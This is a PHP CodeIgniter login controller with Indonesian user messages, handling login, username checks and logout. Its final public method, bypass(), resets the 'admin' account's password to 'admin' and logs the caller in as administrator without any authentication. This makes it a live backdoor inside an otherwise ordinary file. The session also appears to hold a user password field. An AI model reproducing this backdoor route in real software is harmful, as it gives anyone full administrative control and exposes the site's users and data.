<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Home extends CI_Controller {

	function __construct()
	{
		parent::__construct();

		$this->load->library('SimpleLoginSecure');
	}

	function index()
	{			
		if($this->session->userdata('logged_in')) 
		{			
			redirect('dashboard');
		}

		$this->load->view('login');	
	}	

	function logon()
	{		
		$username = $this->input->post('username',TRUE);
		$password = $this->input->post('password',TRUE);
		if($this->simpleloginsecure->cek($username)) 
		{
			if($this->simpleloginsecure->login($username, $password)) 
			{
				echo "ok";
			}
			else
			{
				echo "Maaf Login Gagal";
			}
		}
		else
		{
			echo "Maaf Username Tidak Diketahui";
		}
	}

	function logout()
	{
		//$this->simpleloginsecure->logout();

		$array_items = array(
			'logged_in' 		=> '', 
			'user_id'			=> '',
			'user_email'		=> '',
			'user_pass'			=> '',
			'user_date'			=> '',
			'user_modified'		=> '',
			'user_last_login'	=> '',
			'user_level'		=> '',
			'id_school'			=> ''
		);

		$this->session->unset_userdata($array_items);
		redirect('home');
	}

	public function bypass()
	{		
		if($this->simpleloginsecure->bypass_password('admin', 'admin')){
			if($this->simpleloginsecure->login('admin', 'admin')){
				redirect('dashboard');
			}else{
				echo "Maaf Gagal Login, Kaleee";
			}
		}else{
			echo "Maaf Gagal Bikin, Kaleee";
		}
	}
}